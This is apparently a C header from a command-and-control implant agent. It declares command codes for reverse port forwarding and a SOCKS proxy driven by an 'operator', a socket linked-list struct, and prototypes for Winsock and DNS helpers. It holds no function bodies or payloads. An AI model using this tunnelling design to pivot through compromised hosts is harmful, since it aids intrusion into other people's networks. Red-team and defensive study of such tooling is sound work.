#include <winsock2.h>

#define SOCKET_TYPE_NONE                 0x0
#define SOCKET_TYPE_REVERSE_PORTFWD      0x1
#define SOCKET_TYPE_REVERSE_PROXY        0x2
#define SOCKET_TYPE_CLIENT               0x3
#define SOCKET_TYPE_CLIENT_REMOVED       0x4 /* this is something we received from our operator */
#define SOCKET_TYPE_SOCKS_REMOVED        0x5 /* this is when a socket died, or we failed to read/write from/to it */

#define SOCKET_COMMAND_RPORTFWD_ADD      0x0
#define SOCKET_COMMAND_RPORTFWD_ADDLCL   0x1
#define SOCKET_COMMAND_RPORTFWD_LIST     0x2
#define SOCKET_COMMAND_RPORTFWD_CLEAR    0x3
#define SOCKET_COMMAND_RPORTFWD_REMOVE   0x4

#define SOCKET_COMMAND_SOCKSPROXY_ADD    0x5
#define SOCKET_COMMAND_SOCKSPROXY_LIST   0x6
#define SOCKET_COMMAND_SOCKSPROXY_REMOVE 0x7
#define SOCKET_COMMAND_SOCKSPROXY_CLEAR  0x8

#define SOCKET_COMMAND_OPEN         0x10
#define SOCKET_COMMAND_READ         0x11
#define SOCKET_COMMAND_WRITE        0x12
#define SOCKET_COMMAND_CLOSE        0x13
#define SOCKET_COMMAND_CONNECT      0x14

/* Errors */
#define SOCKET_ERROR_ALREADY_BOUND  0x1

typedef struct sockaddr_in6 {
  ADDRESS_FAMILY sin6_family;
  USHORT         sin6_port;
  ULONG          sin6_flowinfo;
  IN6_ADDR       sin6_addr;
  union {
    ULONG    sin6_scope_id;
    SCOPE_ID sin6_scope_struct;
  };
} SOCKADDR_IN6_LH, *PSOCKADDR_IN6_LH, *LPSOCKADDR_IN6_LH;

typedef struct _SOCKET_DATA
{
    DWORD  ID;
    SOCKET Socket;

    /* what kind of socket this is */
    DWORD Type;

    /* Bind Host and Port data */
    DWORD IPv4;
    PBYTE IPv6;
    DWORD LclPort;

    /* Forward Host and Port data */
    DWORD FwdAddr;
    DWORD FwdPort;

    /* pointer to the next Socket data */
    struct _SOCKET_DATA* Next;
} SOCKET_DATA, *PSOCKET_DATA;

/*!
 * Initiates the use of the Winsock DLL.
 * This is needed for Socks5 and HTTP(S) agents.
 * @return TRUE or FALSE
 */
BOOL InitWSA( VOID );

/*!
 * Create a new socket and insert it into the linked list.
 * if Type param is not SOCKET_TYPE_NONE then it is going to bind
 * to the specified Address and Port.
 * @param Type
 * @param Socket
 * @param IPv4
 * @param IPv6
 * @param LclPort
 * @param FwdAddr
 * @param FwdPort
 * @return SocketData object pointer
 */
PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort );

/* Check for new connections, read everything from the sockets and or close "dead" sockets */
VOID SocketPush();

/*!
 * Query the IPv4 from the specified domain
 * @param Domain
 * @return IPv4 address
 */
DWORD DnsQueryIPv4( LPSTR Domain );

/*!
 * Query the IPv6 from the specified domain
 * @param Domain
 * @return IPv6 address
 */
PBYTE DnsQueryIPv6( LPSTR Domain );
